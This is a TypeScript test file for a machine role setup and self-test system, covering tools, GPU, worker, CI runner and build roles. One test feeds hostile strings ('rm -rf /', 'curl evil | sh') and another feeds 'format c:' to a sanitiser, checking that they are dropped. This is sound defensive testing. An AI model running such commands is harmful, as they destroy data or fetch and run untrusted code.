import assert from 'node:assert/strict';
import { mkdtempSync, readFileSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { after, test } from 'node:test';
import { adminCommand, cleanAdmin } from '../public/role-setup.js';
import { Store } from '../src/db.ts';
import { router } from '../src/http.ts';
import type { CheckResult } from '../src/machines.ts';
import { agentRoutes } from '../src/routes/machines.ts';
import { BUILD_IMAGES_FILE, buildImages, QUIET_MS, RoleSetups, storedRun, WORKER_WAIT_MS, type RoleSetupDeps } from '../src/role-setup.ts';
import type { SelfTest } from '../src/worker-join.ts';
import type { Listed } from '../src/ci-runner.ts';
import type { Project } from '../src/db.ts';

// A role's Set up and self-test (Build 7 M4): the owner's press, the steps the card shows, and the run kept on the role.
const dir = mkdtempSync(join(tmpdir(), 'role-setup-'));
// timing-ok: own temp dir
after(() => rmSync(dir, { recursive: true, force: true }));
let n = 0;

const report = (os: 'windows' | 'linux' | 'macos', agent = 4) => JSON.stringify({ host: 'pc', os, os_name: os === 'windows' ? 'Windows 11' : 'Ubuntu 24.04', wsl: null, in_wsl: false, threads: 8, memory_gb: 16, disk_free_gb: 100, gpu: null, screen: true, admin: true, agent });

function world(o: { os?: 'windows' | 'linux' | 'macos'; agent?: number; online?: boolean; check?: () => Promise<CheckResult[]> } = {}) {
  const store = new Store(join(dir, `db-${n++}.sqlite`));
  const josh = store.createUser({ name: 'Josh', login: 'josh' });
  const mike = store.createUser({ name: 'Mike', login: 'mike' });
  const cara = store.createUser({ name: 'Cara', login: 'cara', admin: true });
  const m = store.createMachine('josh-pc', `hash-${n}`, 'Josh', josh.id);
  store.updateMachine(m.id, { report: report(o.os ?? 'windows', o.agent ?? 4) });
  const sent: unknown[] = [];
  const w = { here: false, testing: false, test: null as SelfTest | null };
  // CI runners (#2064): the runner agents on the row, what a list job answers, the lent schemes and GitHub's runners.
  const ci = { agents: [] as { os: 'windows' | 'linux'; host: string }[], list: { ok: true, output: 'actions.runner.x Running' }, lent: [] as Project[], runners: new Map<number, Listed[] | Error>() };
  let now = 1_000_000;
  const deps: RoleSetupDeps = {
    store,
    online: () => o.online ?? true,
    send: (_id, msg) => (sent.push(msg), o.online ?? true),
    check: o.check ?? (async () => []),
    workers: {
      here: () => w.here,
      testing: () => w.testing,
      startTest: () => (w.test = { id: 'tst', at: now, done: null, ok: false, why: null, lines: [{ key: 'image', name: 'A container runs', state: 'running', text: '' }] }),
      view: () => ({ test: w.test }),
    },
    lendsWorker: () => true,
    ships: () => false,
    ci: {
      agents: () => ci.agents,
      list: async () => ci.list,
      lent: () => ci.lent,
      listed: async (p) => {
        const r = ci.runners.get(p.id) ?? [];
        if (r instanceof Error) throw r;
        return r;
      },
    },
    shotDir: join(dir, `shots-${n}`),
    changed: () => {},
    now: () => now,
  };
  const setups = new RoleSetups(deps);
  const machine = () => store.getMachine(m.id)!;
  const as = (u: typeof josh) => ({ id: u.id, name: u.name, admin: !!u.admin });
  return { store, setups, deps, sent, w, ci, machine, josh: as(josh), mike: as(mike), cara: as(cara), tick: (ms = 0) => ((now += ms), setups.tick()), run: (role: 'tools' | 'screen' | 'turns' | 'gpu' | 'ci' | 'builds') => storedRun(store, m.id, role) };
}

const settle = () => new Promise((r) => setImmediate(r));

test('Tools: Set up says nothing installs, then its test lists each server tools', async () => {
  const t = world({
    check: async () => [
      { server: 'mcp', ok: true, tools: ['a', 'b'], error: null, ms: 1 },
      { server: 'ws', ok: true, tools: ['c'], error: null, ms: 1 },
    ],
  });
  t.setups.start(t.machine(), 'tools', 'setup', t.josh);
  await settle();
  const run = t.run('tools')!;
  assert.equal(run.ok, true);
  assert.equal(run.report, '3 tools');
  assert.deepEqual(
    run.steps.map((s) => s.state),
    ['ok', 'ok', 'ok'],
  );
  assert.equal(run.steps[1].text, 'MCP server: 2 tools: a, b');
  assert.equal(run.steps[2].text, 'Workspace tools: 1 tool: c');
});

test('Tools: nothing ticked fails with what to do', async () => {
  const t = world();
  t.setups.start(t.machine(), 'tools', 'test', t.josh);
  await settle();
  const run = t.run('tools')!;
  assert.equal(run.ok, false);
  assert.match(run.why!, /Tick an MCP server or a folder/);
});

test("only the owner presses it, a shared machine's an admin; one run at a time", async () => {
  const t = world({ check: () => new Promise(() => {}) });
  assert.throws(() => t.setups.start(t.machine(), 'tools', 'test', t.mike), /Only josh-pc's owner/);
  assert.throws(() => t.setups.start(t.machine(), 'tools', 'test', t.cara), /Only josh-pc's owner/);
  t.setups.start(t.machine(), 'tools', 'test', t.josh);
  assert.throws(() => t.setups.start(t.machine(), 'gpu', 'test', t.josh), /still running.*one at a time/);
  t.store.updateMachine(t.machine().id, {});
  const shared = t.store.createMachine('shared', 'h-shared', 'Cara', null);
  t.store.updateMachine(shared.id, { report: report('linux') });
  assert.throws(() => t.setups.start(t.store.getMachine(shared.id)!, 'gpu', 'test', t.josh), /owner/);
  assert.equal(t.setups.start(t.store.getMachine(shared.id)!, 'gpu', 'test', t.cara).role, 'gpu');
});

test('an unknown role or kind is refused; CI on a Mac, or Test with no runner agent, too', () => {
  const t = world();
  const mac = world({ os: 'macos' });
  assert.throws(() => mac.setups.start(mac.machine(), 'ci', 'setup', mac.josh), /Windows or Linux/);
  assert.throws(() => t.setups.start(t.machine(), 'ci', 'test', t.josh), /No runner agent is connected to josh-pc: press Set up/);
  assert.throws(() => t.setups.start(t.machine(), 'disk', 'setup', t.josh), /role must be/);
  assert.throws(() => t.setups.start(t.machine(), 'tools', 'go', t.josh), /kind must be/);
});

test('an agent from before Set up is asked to Update; the screen needs Windows; offline refuses', () => {
  const old = world({ agent: 3 });
  assert.throws(() => old.setups.start(old.machine(), 'screen', 'setup', old.josh), /from before Set up/);
  assert.throws(() => old.setups.start(old.machine(), 'gpu', 'setup', old.josh), /press Update/);
  const linux = world({ os: 'linux' });
  assert.throws(() => linux.setups.start(linux.machine(), 'screen', 'setup', linux.josh), /needs a Windows PC.*Ubuntu/);
  const mac = world({ os: 'macos' });
  assert.throws(() => mac.setups.start(mac.machine(), 'gpu', 'setup', mac.josh), /Linux or WSL/);
  const off = world({ online: false });
  assert.throws(() => off.setups.start(off.machine(), 'screen', 'test', off.josh), /offline/);
});

test("the agent's steps, admin needs and end show on the role; a stranger's id is refused", () => {
  const t = world({ os: 'linux' });
  const run = t.setups.start(t.machine(), 'gpu', 'setup', t.josh);
  assert.deepEqual(t.sent, [{ setup: { id: run.id, role: 'gpu', kind: 'setup' } }]);
  assert.equal(t.setups.heard(t.machine(), { id: 'other', step: { n: 0, text: 'x', state: 'ok' } }), false);
  assert.equal(t.setups.heard(t.machine(), { id: run.id, step: { n: 0, text: 'nvidia-smi: RTX 4080\u001b[0m', state: 'ok' } }), true);
  t.setups.heard(t.machine(), { id: run.id, step: { n: 1, text: 'podman', state: 'fail' } });
  // An agent says what it lacks, never a command; anything else it sends is dropped.
  t.setups.heard(t.machine(), { id: run.id, admin: { needs: ['podman', 'rm -rf /', 'cdi'], pm: 'apt', command: 'curl evil | sh' }, done: { ok: false, why: 'Run the admin command above, then press Set up again.' } });
  const kept = t.run('gpu')!;
  assert.equal(kept.steps[0].text, 'nvidia-smi: RTX 4080[0m');
  assert.deepEqual(kept.admin, { needs: ['podman', 'cdi'], pm: 'apt' });
  assert.equal(kept.ok, false);
  assert.ok(kept.done);
  assert.doesNotMatch(JSON.stringify(kept), /evil/);
  // Ended: a late word is refused.
  assert.equal(t.setups.heard(t.machine(), { id: run.id, step: { n: 2, text: 'late', state: 'ok' } }), false);
});

test("a run whose agent goes offline or quiet fails; the CI role's runner_host stays beside a run", () => {
  const t = world({ os: 'linux' });
  t.store.writeMachineRoles(t.machine().id, (roles) => roles.map((r) => (r.role === 'gpu' ? { ...r, setup: { runner_host: true } } : r)));
  t.setups.start(t.machine(), 'gpu', 'test', t.josh);
  t.tick(QUIET_MS + 1);
  const run = t.run('gpu')!;
  assert.equal(run.ok, false);
  assert.match(run.why!, /said nothing/);
  assert.equal(t.store.machineRoles(t.machine().id).find((r) => r.role === 'gpu')!.setup!.runner_host, true);
});

test('a run cut off by a restart shows as failed', () => {
  const t = world({ os: 'linux' });
  t.setups.start(t.machine(), 'gpu', 'test', t.josh);
  assert.equal(t.run('gpu')!.done, null);
  new RoleSetups(t.deps);
  assert.match(t.run('gpu')!.why!, /restarted/);
});

test('Minion turns on Linux: the card shows the install command, then T5 self-test runs once the worker is here', () => {
  const t = world({ os: 'linux' });
  const run = t.setups.start(t.machine(), 'turns', 'setup', t.josh);
  assert.equal(run.worker_install, true);
  assert.deepEqual(t.sent, []);
  t.tick(5000);
  assert.equal(t.run('turns')!.done, null);
  t.w.here = true;
  t.tick(5000);
  let kept = t.run('turns')!;
  assert.equal(kept.worker_install, false);
  assert.equal(kept.steps[1].text, 'The worker connected to Citadel');
  assert.match(kept.steps[2].text, /Self-test: A container runs/);
  t.w.test = { ...t.w.test!, done: 1, ok: true, lines: [{ key: 'image', name: 'A container runs', state: 'ok', text: 'podman 5' }] };
  t.tick(5000);
  kept = t.run('turns')!;
  assert.equal(kept.ok, true);
  assert.equal(kept.steps[2].text, 'Self-test: A container runs: podman 5');
});

test('Minion turns on Windows: the agent installs it; no worker in time fails', () => {
  const t = world({ os: 'windows' });
  const run = t.setups.start(t.machine(), 'turns', 'setup', t.josh);
  assert.equal(run.worker_install, false);
  assert.equal((t.sent[0] as { setup: { role: string } }).setup.role, 'turns');
  t.setups.heard(t.machine(), { id: run.id, step: { n: 0, text: 'install-worker.ps1 finished', state: 'ok' }, done: { ok: true } });
  assert.equal(t.run('turns')!.done, null);
  t.tick(WORKER_WAIT_MS + 1);
  assert.match(t.run('turns')!.why!, /No worker came up/);
});

test('a long Windows install still gets its whole wait for the worker, counted from when it finished', () => {
  const t = world({ os: 'windows' });
  const run = t.setups.start(t.machine(), 'turns', 'setup', t.josh);
  // 39 minutes of the installer's lines, each heard within the agent's quiet limit, then its end.
  for (let i = 0; i < 3; i++) t.tick(13 * 60_000), t.setups.heard(t.machine(), { id: run.id, step: { n: 0, text: `installing ${i}`, state: 'running' } });
  t.setups.heard(t.machine(), { id: run.id, done: { ok: true } });
  t.tick(5_000);
  assert.equal(t.run('turns')!.done, null);
  t.w.here = true;
  t.tick(5_000);
  assert.equal(t.w.test?.id, 'tst', "T5's self-test started");
});

test("the agent's two routes are on the machines' own address, beside its other routes", () => {
  const agents = router(agentRoutes);
  assert.ok(agents.knows('/api/machines/role-setup'));
  assert.ok(agents.knows('/api/machines/role-setup/shot'));
});

test('Test on Minion turns with no worker asks for Set up', () => {
  const t = world({ os: 'linux' });
  assert.throws(() => t.setups.start(t.machine(), 'turns', 'test', t.josh), /press Set up/);
});

test("the screen's screenshot is kept for its run only", async () => {
  const t = world();
  const run = t.setups.start(t.machine(), 'screen', 'test', t.josh);
  assert.equal(await t.setups.shot(t.machine(), 'nope', Buffer.from('x')), false);
  assert.equal(await t.setups.shot(t.machine(), run.id, Buffer.from('png')), true);
  assert.equal(readFileSync(t.setups.shotFile(t.machine().id), 'utf8'), 'png');
  assert.ok(t.run('screen')!.shot);
  assert.equal(t.setups.servedShot(t.machine().id), t.setups.shotFile(t.machine().id));
  // A machine with no screen shot of its own (a reused id after a removal) is served none, even with the file there.
  t.store.setMachineRole(t.machine().id, 'screen', { setup: null });
  assert.equal(t.setups.servedShot(t.machine().id), null);
});

test('the admin command comes from fixed words only, one shell for one OS', () => {
  assert.deepEqual(cleanAdmin({ needs: ['cdi', 'podman', 'podman'], pm: 'apt' }), { needs: ['podman', 'cdi'], pm: 'apt' });
  assert.equal(cleanAdmin({ needs: ['wsl', 'podman'], pm: 'apt' }), null);
  assert.equal(cleanAdmin({ needs: ['format c:'] }), null);
  const gpu = adminCommand({ needs: ['nvidia-toolkit', 'cdi'], pm: 'apt' })!;
  assert.equal(gpu.tag, 'bash');
  assert.match(gpu.command!, /apt-get install -y nvidia-container-toolkit && \\\nsudo nvidia-ctk cdi generate --output=\/etc\/cdi\/nvidia\.yaml$/);
  assert.deepEqual(adminCommand({ needs: ['wsl'] }), { tag: 'powershell-admin', command: 'wsl --install --no-distribution', what: 'WSL 2', after: 'Then restart the PC and press Set up again.' });
  const other = adminCommand({ needs: ['podman'], pm: 'pacman' })!;
  assert.equal(other.command, null);
  assert.match(other.after, /neither apt nor dnf/);
});

test('CI runners: Set up shows the install command and waits for the runner agent, then tests it with the PC offline', async () => {
  const t = world({ online: false });
  const delve = t.store.createProject('Delve', 'https://github.com/caraminden/delve.git', t.josh.id);
  const run = t.setups.start(t.machine(), 'ci', 'setup', t.josh);
  assert.equal(run.worker_install, true, 'the card shows the runner agent install');
  assert.match(run.steps[0].text, /install commands below/);
  assert.deepEqual(t.sent, [], 'nothing goes to the machine agent');
  t.tick(5000);
  assert.equal(t.run('ci')!.done, null);
  t.ci.agents = [{ os: 'linux', host: 'JOSH-PC' }];
  t.ci.lent = [delve];
  t.ci.runners.set(delve.id, [
    { id: 1, name: 'JOSH-PC', status: 'online', busy: false, labels: ['self-hosted', 'delve-ci-linux'] },
    { id: 2, name: 'JOSH-PC-2', status: 'online', busy: true, labels: ['delve-ci-linux-side'] },
    { id: 3, name: 'OTHER-PC', status: 'offline', busy: false, labels: ['delve-ci-linux'] },
  ]);
  t.tick(5000);
  await settle();
  const kept = t.run('ci')!;
  assert.equal(kept.worker_install, false);
  assert.deepEqual(
    kept.steps.map((x) => `${x.state} ${x.text}`),
    ['ok Run the install commands below on that PC', 'ok The runner agent connected to Citadel', 'ok Linux runner agent connected, from JOSH-PC', 'ok The Linux runner agent answers a job', 'ok Delve: JOSH-PC idle, JOSH-PC-2 busy'],
    "another PC's runner, offline, isn't this PC's",
  );
  assert.equal(kept.ok, true);
  assert.equal(kept.report, '2 runners for 1 scheme');
});

test("CI runners' Test fails on a runner GitHub shows offline, a GitHub refusal or a job the agent fails; a scheme with none yet passes", async () => {
  const t = world();
  const [a, b, c] = ['Delve', 'Peek Auras', 'Cantrips'].map((n) => t.store.createProject(n, `https://github.com/caraminden/${n.toLowerCase().replace(' ', '-')}.git`, t.josh.id));
  t.ci.agents = [{ os: 'windows', host: 'JOSH-PC' }];
  t.ci.lent = [a, b, c];
  t.ci.runners.set(a.id, [{ id: 1, name: 'JOSH-PC', status: 'offline', busy: false, labels: ['delve-ci'] }]);
  t.ci.runners.set(b.id, new Error("Cara's GitHub login can't reach caraminden/peek-auras"));
  t.ci.list = { ok: false, output: 'line one\nThe agent is busy with another job' };
  t.setups.start(t.machine(), 'ci', 'test', t.josh);
  await settle();
  await settle();
  const kept = t.run('ci')!;
  assert.deepEqual(
    kept.steps.map((x) => `${x.state} ${x.text}`),
    [
      'ok Windows runner agent connected, from JOSH-PC',
      'fail The Windows runner agent answers a job: The agent is busy with another job',
      'fail Delve: JOSH-PC offline',
      "fail Peek Auras: Cara's GitHub login can't reach caraminden/peek-auras",
      'ok Cantrips: no runner here yet; one registers by itself when its CI first asks',
    ],
  );
  assert.equal(kept.ok, false);
});

const digest = (c: string) => `sha256:${c.repeat(64)}`;
const imagesFile = (images: Record<string, { image: string | null; mb: number | null }>) => JSON.stringify({ images, volumes: ['citadel-gradle', 'citadel-cargo', 'citadel-npm', 'not a volume'] });

test('Builds Set up sends the images by digest, the volumes and its threads cap to the agent; a failed step shows on the role', () => {
  const t = world({ os: 'linux' });
  t.deps.buildImages = imagesFile({ android: { image: `ghcr.io/caraminden/citadel-build-android@${digest('a')}`, mb: 2500 }, node: { image: `ghcr.io/caraminden/citadel-build-node@${digest('b')}`, mb: 300 }, rust: { image: `ghcr.io/caraminden/citadel-build-rust@${digest('c')}`, mb: 900 } });
  t.store.writeMachineRoles(t.machine().id, (roles) => roles.map((r) => (r.role === 'builds' ? { ...r, on: true, caps: { threads: 4 } } : r)));
  const run = t.setups.start(t.machine(), 'builds', 'setup', t.josh);
  assert.deepEqual(t.sent, [
    {
      setup: {
        id: run.id,
        role: 'builds',
        kind: 'setup',
        caps: { threads: 4 },
        builds: { images: { android: `ghcr.io/caraminden/citadel-build-android@${digest('a')}`, node: `ghcr.io/caraminden/citadel-build-node@${digest('b')}`, rust: `ghcr.io/caraminden/citadel-build-rust@${digest('c')}` }, volumes: ['citadel-gradle', 'citadel-cargo', 'citadel-npm'] },
      },
    },
  ]);
  t.setups.heard(t.machine(), { id: run.id, step: { n: 0, text: 'podman version 4.9.3', state: 'ok' } });
  t.setups.heard(t.machine(), { id: run.id, step: { n: 1, text: "The hello-world APK didn't build: Could not resolve com.android.tools.build:gradle:8.13.0", state: 'fail' }, done: { ok: false, why: "The hello-world APK didn't build: Could not resolve com.android.tools.build:gradle:8.13.0" } });
  const kept = t.run('builds')!;
  assert.equal(kept.ok, false);
  assert.deepEqual(kept.steps.at(-1), { text: "The hello-world APK didn't build: Could not resolve com.android.tools.build:gradle:8.13.0", state: 'fail' });
  assert.match(kept.why!, /Could not resolve/);
});

test("Builds refuses a Mac, and images that aren't published or aren't pinned by digest", () => {
  const mac = world({ os: 'macos' });
  assert.throws(() => mac.setups.start(mac.machine(), 'builds', 'setup', mac.josh), /Linux, or Windows with WSL/);
  const t = world({ os: 'linux' });
  t.deps.buildImages = imagesFile({ android: { image: `ghcr.io/caraminden/citadel-build-android@${digest('a')}`, mb: 1 }, node: { image: null, mb: null } });
  assert.throws(() => t.setups.start(t.machine(), 'builds', 'setup', t.josh), /aren't all published yet \(citadel-build-node, citadel-build-rust\)/);
  assert.equal(t.sent.length, 0);
  assert.throws(() => buildImages(imagesFile({ android: { image: 'ghcr.io/caraminden/citadel-build-android:latest', mb: 1 } })), /pinned by digest/);
  // The shipped file reads: published or not, it is the shape both sides take.
  try {
    const shipped = buildImages();
    assert.ok(Object.values(shipped.images).every((i) => /^ghcr\.io\/caraminden\/citadel-build-[a-z]+@sha256:[a-f0-9]{64}$/.test(i)));
    assert.deepEqual(shipped.volumes, ['citadel-gradle', 'citadel-cargo', 'citadel-npm']);
  } catch (err) {
    assert.match((err as Error).message, /aren't all published yet/);
  }
  assert.ok(JSON.parse(readFileSync(BUILD_IMAGES_FILE, 'utf8')).images.android);
});
